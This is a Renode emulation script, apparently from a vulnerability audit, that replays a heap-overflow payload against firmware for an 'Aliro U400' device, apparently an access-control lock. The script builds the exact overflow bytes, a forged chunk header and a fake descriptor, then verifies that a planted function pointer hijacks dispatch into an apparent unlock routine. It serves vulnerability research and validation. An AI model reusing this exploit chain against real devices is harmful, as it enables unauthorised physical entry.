@@ -1,0 +1,133 @@
+:name: Aliro U400 E2E FIDELITY — replay the LIVE aliro_unlock_producer.py overflow() bytes
+:description: Settles ONE question: do the ACTUAL live op2 overflow bytes (from aliro_unlock_producer.py
+: overflow()), fed through the firmware's REAL memcpy (on_data_received sub_805e7b0) + REAL dispatch
+: (sub_801d96c), correctly reconstruct D_B and drive blx into the producer sub_8072174 with
+: r1=0x20024100 / r0=D_B+4 — WITHOUT any direct writes to D_B's fields. Builds on aliro_e2e_chain.resc:
+: same boot-SRAM overlay, same FreeRTOS configASSERT/FPU workarounds, same sentinel state machine.
+: The overflow scratch @0x2000ED00 is the byte-identical output of overflow(cid,conn=2,dest=SLOT,
+: r1val=S,mps=247,sdu=0x40): 60x0x41 + CHUNK(0100080009000900) + dbimage(0x3c). CID patched at runtime
+: from the REAL *(D_B+0x0c) so find_transfer matches. NO field of D_B is hand-written; only the SDK
+: list-head plumbing global (0x20013878->D_B+4, which the real registration would set) and the benign
+: op1 command struct at S=0x20024100 (a separate arbitrary-write in the live tool).
+#
+# op0 start_recv_data(1)->D_A ; op1 on_data_received(D_A+4,0,0x10)->B1=malloc(0x40), *(D_A+0x12)=0x40 ;
+# op2 start_recv_data(2)->D_B ; op3 THE OVERFLOW on_data_received(D_A+4,off=4,len=128,data=0x2000ED00) ;
+# op4 PLANT SLOT (write-frame) on_data_received(D_B+4,off=0,len=4,data=0x2000EC00 [=0x08072175]) ;
+# op5 DISPATCH sub_801d96c(frame) built from real D_B conn/cid + list-head=D_B+4.
+
+using sysbus
+emulation SetGlobalSerialExecution true
+mach create "mg24"
+machine LoadPlatformDescription @platforms/boards/silabs/brd4186c.repl
+sysbus LoadELF @/home/chen/aliro-reassembly-audit/firmware/U400_primary_target.elf
+sysbus.cpu VectorTableOffset 0x08006000
+
+# --- overlay the REAL post-boot SRAM (restores heap + allocator control block) ---
+python "import System; SB=self.Machine.SystemBus; data=System.IO.File.ReadAllBytes(\"/home/chen/matter-renode-work/sl-renode/scripts/silabs-vuln/aliro_boot_sram.bin\"); SB.WriteBytes(data, 0x20000000, False, None); System.Console.WriteLine(\"OVERLAY restored {0} bytes; tail-base now 0x{1:X}\".format(len(data), SB.ReadDoubleWord(0x20012894)))"
+
+# fresh log
+python "import System; System.IO.File.WriteAllText('/tmp/e2e_fidelity.txt','=== ALIRO E2E FIDELITY (live overflow bytes replay) ===\n')"
+
+# --- stubs: loggers + FreeRTOS transfer-list lock gate (same as e2e_chain) ---
+sysbus WriteWord 0x8033598 0x4770
+sysbus WriteWord 0x80336f0 0x4770
+sysbus WriteWord 0x80cae30 0x4770
+sysbus WriteDoubleWord 0x801e0f8 0x47702001
+sysbus WriteWord 0x801e124 0x4770
+sysbus WriteWord 0x801e114 0x4770
+sysbus WriteWord 0x801df64 0x2000
+sysbus WriteWord 0x801df66 0x4770
+# NEUTRALIZE FreeRTOS configASSERT-fail trap sub_80348c4 -> movs r0,#0; bx lr (emulation artifact)
+sysbus WriteWord 0x80348c4 0x2000
+sysbus WriteWord 0x80348c6 0x4770
+# Enable FPU (partial boot never set CPACR)
+sysbus.cpu FpuEnabled true
+sysbus.cpu CPACR 0x00F00000
+# sentinel LR trap + idle spin
+sysbus WriteWord 0x2000EE00 0xE7FE
+sysbus WriteWord 0x2000EF00 0xE7FE
+sysbus WriteDoubleWord 0x2000E900 0x00000000
+# on_data memcpy source for op1 (0x41 fill, 16 bytes)
+sysbus WriteDoubleWord 0x2000EA00 0x41414141
+sysbus WriteDoubleWord 0x2000EA04 0x41414141
+sysbus WriteDoubleWord 0x2000EA08 0x41414141
+sysbus WriteDoubleWord 0x2000EA0C 0x41414141
+# SLOT write-frame source: the 4-byte payload 0x08072175 (PRODUCER|thumb) that the write-frame
+# memcpy's into *(D_B+0x38). Lives at 0x2000EC00 (low RAM, outside heap).
+sysbus WriteDoubleWord 0x2000EC00 0x08072175
+
+$sdu?=0x40
+sysbus WriteDoubleWord 0x2000E8F0 $sdu
+
+# ---------------------------------------------------------------------------
+# STATE MACHINE sentinel @0x2000EE00
+#  o=0 start_recv_data(1)->D_A
+#  o=1 on_data_received(D_A+4,0,0x10,0x2000EA00)->B1; also set *(D_A+0x12)=sdu
+#  o=2 start_recv_data(2)->D_B
+#  o=3 [BUILD live overflow @0x2000ED00 from real D_B cid] then on_data_received(D_A+4,4,128,0x2000ED00)
+#  o=4 [record D_B post-overflow snapshot] on_data_received(D_B+4,0,4,0x2000EC00)  (SLOT write-frame)
+#  o=5 [plant cmd struct at S; set list-head=D_B+4; build dispatch frame] sub_801d96c(frame)
+# ---------------------------------------------------------------------------
+sysbus.cpu AddHook 0x2000EE00 "from Antmicro.Renode.Peripherals.CPU import RegisterValue as R; import System; B=self.Bus; o=B.ReadDoubleWord(0x2000E900); sdu=B.ReadDoubleWord(0x2000E8F0); DA=B.ReadDoubleWord(0x2001b758); DB=B.ReadDoubleWord(0x2001b75c); B1=(B.ReadDoubleWord(DA+0x38) if DA else 0); z1=(B.WriteWord(DA+0x12,sdu) if (o==1 and DA) else 0); rec=([B.WriteDoubleWord(0x2000EB00,DA),B.WriteDoubleWord(0x2000EB04,B1),B.WriteDoubleWord(0x2000EB08,DB)] if o==3 else 0); ovbase=[0x41414141]*15+[0x00080001,0x00090009,0x00000002,0x00000000,0x20002828,0x01F40000,0x000000F7,0x00800000,0x00000004,0x000003E8,0x20024100,0x00000000,0x00000002,0x00000000,0x00000002,0x00000000,0x2000282C]; bov=([B.WriteDoubleWord(0x2000ED00+4*i,ovbase[i]) for i in range(32)] if o==3 else 0); realcid=(B.ReadWord(DB+0x0c) if o==3 else 0); pcid=(B.WriteWord(0x2000ED50,realcid) if o==3 else 0); lgov=(System.IO.File.AppendAllText('/tmp/e2e_fidelity.txt','OP3 BUILD-OVERFLOW: D_A=0x{0:X} B1=0x{1:X} D_B=0x{2:X} realCID=0x{3:X}; wrote 128B live overflow @0x2000ED00 (memcpy dest=B1+4=0x{4:X}, dbimage should land @D_B=0x{5:X})\\n'.format(DA,B1,DB,realcid,B1+4,DB)) if o==3 else 0); snapA=(System.IO.File.AppendAllText('/tmp/e2e_fidelity.txt','=== A) D_B AFTER OVERFLOW (real memcpy) ===\\n D_B+0x00=0x{0:08X} (conn, want 2)\\n D_B+0x04=0x{1:08X} (list-next)\\n D_B+0x08=0x{2:08X} (VTABLE, want 0x20002828)\\n D_B+0x0c=0x{3:08X} (cid dword, want (0x01F4<<16)|cid)\\n D_B+0x12=0x{9:04X} (u16 sdu@+0x12, want 0x0000)\\n D_B+0x20=0x{4:08X} (S/r1, want 0x20024100)\\n D_B+0x24=0x{5:08X} (want 0)\\n D_B+0x28=0x{6:08X} (conn, want 2)\\n D_B+0x38=0x{7:08X} (SLOT, want 0x2000282C)\\n CHUNK@B1+0x40=0x{8:08X},0x{10:08X} (want 0x00080001,0x00090009)\\n'.format(B.ReadDoubleWord(DB+0x00),B.ReadDoubleWord(DB+0x04),B.ReadDoubleWord(DB+0x08),B.ReadDoubleWord(DB+0x0c),B.ReadDoubleWord(DB+0x20),B.ReadDoubleWord(DB+0x24),B.ReadDoubleWord(DB+0x28),B.ReadDoubleWord(DB+0x38),B.ReadDoubleWord(B1+0x40),B.ReadWord(DB+0x12),B.ReadDoubleWord(B1+0x44))) if o==4 else 0); ps=([B.WriteDoubleWord(0x20024100,0),B.WriteDoubleWord(0x20024104,0x081505ac),B.WriteDoubleWord(0x20024108,8),B.WriteDoubleWord(0x2002410C,0xC8),B.WriteDoubleWord(0x20024110,0)] if o==5 else 0); lh=(B.ReadDoubleWord(0x801da58) if o==5 else 0); setlh=(B.WriteDoubleWord(lh,DB+4) if o==5 else 0); pre=(B.WriteDoubleWord(0x2000EB30,B.ReadDoubleWord(0x2000282C)) if o==5 else 0); mt=(B.ReadByte(DB+0x28) if o==5 else 0); cid=(B.ReadWord(DB+0x0c) if o==5 else 0); df=([B.WriteByte(0x2000EFC0,mt),B.WriteWord(0x2000EFC1,cid),B.WriteByte(0x2000EFC3,0x06),B.WriteWord(0x2000EFC4,sdu),B.WriteDoubleWord(0x2000EFC6,0x42424242)] if o==5 else 0); lgd=(System.IO.File.AppendAllText('/tmp/e2e_fidelity.txt','=== B) SLOT after write-frame: *(0x2000282C)=0x{0:08X} (want 0x08072175) ===\\nOP5 DISPATCH: list-head 0x{1:X} <- D_B+4=0x{2:X}; frame@0x2000EFC0 conn={3} cid=0x{4:X} datalen=6; cmd-struct S=0x20024100 planted (name=0x081505ac len=8 speed=0xC8)\\n'.format(B.ReadDoubleWord(0x2000282C),lh,DB+4,mt,cid)) if o==5 else 0); seq=[(0x805e9c8,1,0,0,0),(0x805e7b0,DA+4,0,0x10,0x2000EA00),(0x805e9c8,2,0,0,0),(0x805e7b0,DA+4,4,128,0x2000ED00),(0x805e7b0,DB+4,0,4,0x2000EC00),(0x801d96c,0x2000EFC0,0,0,0),(0,0,0,0,0)]; t=seq[o] if o<len(seq) else (0,0,0,0,0); a=t[0]; B.WriteDoubleWord(0x2000E900,o+1); self.SetRegister(0,R.Create(t[1],32)); self.SetRegister(1,R.Create(t[2],32)); self.SetRegister(2,R.Create(t[3],32)); self.SetRegister(3,R.Create(t[4],32)); self.SetRegister(13,R.Create(0x2003F000,32)); self.SetRegister(14,R.Create(0x2000EE01,32)); self.SetRegister(15,R.Create(a if a else 0x2000EF00,32))"
+
+# ---------------------------------------------------------------------------
+# observation hooks
+# ---------------------------------------------------------------------------
+sysbus.cpu AddHook 0x805e5fc "import System; System.IO.File.AppendAllText('/tmp/e2e_fidelity.txt','CREATE_DESC conn={0}\\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x805e7b0 "import System; System.IO.File.AppendAllText('/tmp/e2e_fidelity.txt','ON_DATA node=0x{0:X} off={1} len={2} src=0x{3:X}\\n'.format(self.GetRegister(0).RawValue, self.GetRegister(1).RawValue, self.GetRegister(2).RawValue, self.GetRegister(3).RawValue))"
+sysbus.cpu AddHook 0x805e838 "import System; System.IO.File.AppendAllText('/tmp/e2e_fidelity.txt','  MEMCPY dst=0x{0:X} src=0x{1:X} len={2}\\n'.format(self.GetRegister(0).RawValue, self.GetRegister(1).RawValue, self.GetRegister(2).RawValue))"
+sysbus.cpu AddHook 0x801d96c "import System; System.IO.File.AppendAllText('/tmp/e2e_fidelity.txt','RX_HANDLER sub_801d96c frame=0x{0:X} conn={1} cid=0x{2:X} datalen={3}\\n'.format(self.GetRegister(0).RawValue, self.Bus.ReadByte(self.GetRegister(0).RawValue), self.Bus.ReadWord(self.GetRegister(0).RawValue+1), self.Bus.ReadByte(self.GetRegister(0).RawValue+3)))"
+sysbus.cpu AddHook 0x801d980 "import System; System.IO.File.AppendAllText('/tmp/e2e_fidelity.txt','  FIND_TRANSFER ret=0x{0:X}\\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x801d9be "import System; System.IO.File.AppendAllText('/tmp/e2e_fidelity.txt','=== C) DISPATCH_BLX r7(target)=0x{0:X} r0=0x{1:X} r1=0x{2:X} r2(len)=0x{3:X}\\n'.format(self.GetRegister(7).RawValue, self.GetRegister(0).RawValue, self.GetRegister(1).RawValue, self.GetRegister(2).RawValue))"
+# PRODUCER entry
+sysbus.cpu AddHook 0x8072174 "import System; System.IO.File.AppendAllText('/tmp/e2e_fidelity.txt','*** REACHED PRODUCER sub_8072174  r0=0x{0:X} r1(cmd)=0x{1:X} | cmd.name_ptr=0x{2:X} cmd.len={3} cmd.speed={4}\\n'.format(self.GetRegister(0).RawValue, self.GetRegister(1).RawValue, self.Bus.ReadDoubleWord(self.GetRegister(1).RawValue+4), self.Bus.ReadDoubleWord(self.GetRegister(1).RawValue+8), self.Bus.ReadDoubleWord(self.GetRegister(1).RawValue+0x0c)))"
+# TRAP catcher (fault spin): dump stacked exception frame (faulting PC)
+sysbus.cpu AddHook 0x80D4904 "import System; B=self.Bus; sp=self.GetRegister(13).RawValue; System.IO.File.AppendAllText('/tmp/e2e_fidelity.txt','!!! HIT TRAP-SPIN 0x080D4904 LR=0x{0:X} SP=0x{1:X} | frame r0=0x{2:X} r1=0x{3:X} exPC=0x{4:X} xPSR=0x{5:X}\\n'.format(self.GetRegister(14).RawValue, sp, B.ReadDoubleWord(sp), B.ReadDoubleWord(sp+4), B.ReadDoubleWord(sp+24), B.ReadDoubleWord(sp+28)))"
+
+sysbus.cpu SetRegister 13 0x2003F000
+sysbus.cpu SetRegister 14 0x2000EE01
+sysbus.cpu SetRegister 0 0
+sysbus.cpu PC 0x2000EE00
+sysbus.cpu Step 4000000
+
+echo "==================== E2E FIDELITY RESULT ===================="
+python "import System; SB=self.Machine.SystemBus; System.Console.WriteLine('SDU=0x{0:X}  final op counter={1}'.format(SB.ReadDoubleWord(0x2000E8F0), SB.ReadDoubleWord(0x2000E900)))"
+echo ">>> D_A / B1 / D_B:"
+sysbus ReadDoubleWord 0x2000EB00
+sysbus ReadDoubleWord 0x2000EB04
+sysbus ReadDoubleWord 0x2000EB08
+echo ">>> SLOT 0x2000282C pre-writeframe / now (expect 0x08072175):"
+sysbus ReadDoubleWord 0x2000EB30
+sysbus ReadDoubleWord 0x2000282C
+echo ">>> FINAL PC:"
+python "import System; c=self.Machine[\"sysbus.cpu\"]; System.Console.WriteLine(\"FINAL_PC=0x{0:X}\".format(c.PC.RawValue))"
+echo ">>> ===== A) D_B (0x20025F60) FIELDS AS ACTUALLY WRITTEN BY REAL MEMCPY ====="
+echo ">>> D_B+0x00 (conn, want 0x00000002):"
+sysbus ReadDoubleWord 0x20025F60
+echo ">>> D_B+0x04 (list-next):"
+sysbus ReadDoubleWord 0x20025F64
+echo ">>> D_B+0x08 (VTABLE, want 0x20002828):"
+sysbus ReadDoubleWord 0x20025F68
+echo ">>> D_B+0x0C (cid dword, want (0x01F4<<16)|cid):"
+sysbus ReadDoubleWord 0x20025F6C
+echo ">>> D_B+0x10 (u16 0x00F7 @+0x10 ; +0x12 want 0x0000):"
+sysbus ReadDoubleWord 0x20025F70
+echo ">>> D_B+0x20 (S/r1, want 0x20024100):"
+sysbus ReadDoubleWord 0x20025F80
+echo ">>> D_B+0x24 (want 0x00000000):"
+sysbus ReadDoubleWord 0x20025F84
+echo ">>> D_B+0x28 (conn, want 0x00000002):"
+sysbus ReadDoubleWord 0x20025F88
+echo ">>> D_B+0x38 (SLOT, want 0x2000282C):"
+sysbus ReadDoubleWord 0x20025F98
+echo ">>> CHUNK @ B1+0x40 = 0x20025F58 (want 0x00080001):"
+sysbus ReadDoubleWord 0x20025F58
+echo ">>> CHUNK @ B1+0x44 = 0x20025F5C (want 0x00090009):"
+sysbus ReadDoubleWord 0x20025F5C
+echo ">>> overflow SOURCE dword @0x2000ED54 (feeds D_B+0x10; want 0x000000F7 so byte@+0x12=0x00):"
+sysbus ReadDoubleWord 0x2000ED54
+echo ">>> D_B+0x14 (0x20025F74, want 0x0080 lo-u16 from dbimage[0x16]=0x0080):"
+sysbus ReadDoubleWord 0x20025F74
+echo ">>> ---- /tmp/e2e_fidelity.txt (trace) ----"
+python "import System; System.Console.Write(System.IO.File.ReadAllText('/tmp/e2e_fidelity.txt'))"
+quit
